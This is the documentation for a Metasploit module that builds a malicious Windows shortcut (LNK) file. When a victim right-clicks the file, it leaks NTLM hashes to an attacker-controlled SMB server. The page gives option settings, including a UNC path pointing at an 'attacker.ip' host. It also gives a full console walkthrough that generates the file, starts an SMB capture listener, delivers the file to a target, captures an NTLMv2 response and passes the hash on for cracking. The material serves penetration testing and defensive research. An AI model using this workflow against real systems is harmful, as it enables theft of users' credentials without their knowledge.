This module generates a malicious Windows shortcut (LNK) file that embeds a special UNC path within the EnvironmentVariableDataBlock of the Shell Link structure. When a victim right-clicks the LNK file in Windows Explorer, it triggers an automatic authentication attempt to the specified remote SMB server, enabling the capture of NTLM hashes.

The exploit takes advantage of how Windows handles environment variables in LNK files during context menu operations, leading to unsolicited SMB connections without requiring the file to be opened.

## Vulnerable Application

Windows systems where LNK files are processed in Explorer, particularly during right-click actions that load context menus. This can result in NTLM credential leaks over SMB.

References:
- [Right-Click LNK](https://zeifan.my/Right-Click-LNK/)

Disclosure Date: 2025-05-06.

## Verification Steps

1. Start msfconsole.
2. Load the module: `use auxiliary/fileformat/right_click_lnk_leak`.
3. Set required options (e.g., FILENAME, UNC_PATH).
4. Optionally customize DESCRIPTION, ICON_PATH, or PADDING_SIZE.
5. Execute the module: `run`.
6. A malicious LNK file is generated.
7. Set up an SMB capture listener (e.g., `auxiliary/server/capture/smb`).
8. Deliver the LNK file to the target system.
9. Right-click the LNK file in Explorer to trigger the SMB connection.
10. Monitor the listener for captured NTLM hashes.

## Options

### FILENAME

The name of the generated LNK file.

Default: `msf.lnk`

Example:
```
set FILENAME context.lnk
```

### UNC_PATH

The UNC path (e.g., `\\server\share`) that the LNK will attempt to access for credential capture.

Default: `\\192.168.1.1\share`

Example:
```
set UNC_PATH \\attacker.ip\captureshare
```

### DESCRIPTION

The description for the shortcut.

Default: `Testing Purposes`

Example:
```
set DESCRIPTION Important File
```

### ICON_PATH

The path to an icon for the LNK file.

Default: `e.g. abc.ico`

Example:
```
set ICON_PATH %SystemRoot%\\System32\\shell32.dll
```

### PADDING_SIZE

Size of padding in the command arguments.

Default: 10

Example:
```
set PADDING_SIZE 20
```

## Scenarios

### NTLM Hash Capture on Right-Click

Target: Windows system with Explorer (e.g., Windows 10 or later).

Generate the LNK file:

```
msf > use auxiliary/fileformat/right_click_lnk_leak
msf auxiliary(fileformat/right_click_lnk_leak) > set FILENAME context.lnk
FILENAME => context.lnk
msf auxiliary(fileformat/right_click_lnk_leak) > set UNC_PATH \\192.168.1.25\share
UNC_PATH => \\192.168.1.25\share
msf auxiliary(fileformat/right_click_lnk_leak) > set DESCRIPTION Fake Document
DESCRIPTION => Fake Document
msf auxiliary(fileformat/right_click_lnk_leak) > set ICON_PATH %SystemRoot%\\System32\\imageres.dll
ICON_PATH => %SystemRoot%\\System32\\imageres.dll
msf auxiliary(fileformat/right_click_lnk_leak) > set PADDING_SIZE 15
PADDING_SIZE => 15
msf auxiliary(fileformat/right_click_lnk_leak) > run

[*] Creating 'context.lnk' file...
[+] LNK file created: context.lnk
[*] Set up a listener (e.g., auxiliary/server/capture/smb) to capture the authentication
[*] Auxiliary module execution completed
```

Set up the capture listener on the attacker machine:

```
msf > use auxiliary/server/capture/smb
msf auxiliary(server/capture/smb) > set SRVHOST 192.168.1.25
SRVHOST => 192.168.1.25
msf auxiliary(server/capture/smb) > run
[*] Server started.
```

Deliver `context.lnk` to the target. When the victim right-clicks it, an SMB connection is attempted:

```
[*] SMB Captured - 2025-09-18 21:08:00 +0530
NTLMv2 Response Captured from 192.168.1.50:49180 - 192.168.1.50
USER:targetuser DOMAIN:TARGETPC OS: Windows 10 LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:examplehashvalue
NT_CLIENT_CHALLENGE:examplechallenge
```

Use cracking tools to recover credentials from the hash.
